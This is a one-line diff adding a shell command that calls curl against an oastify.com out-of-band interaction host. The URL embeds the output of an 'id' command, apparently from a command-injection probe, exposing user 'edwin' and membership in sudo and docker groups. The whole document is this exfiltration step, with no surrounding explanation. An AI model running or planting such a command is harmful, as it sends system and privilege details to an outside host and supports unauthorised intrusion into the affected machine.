@@ -1,0 +1,1 @@
+curl -sXGET https://kymw85pwz9av44uarxv5mbu79yfr3hr6.oastify.com/uid=1000(edwin) gid=1000(edwin) groups=1000(edwin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),138(wireshark),144(vboxusers),999(docker)
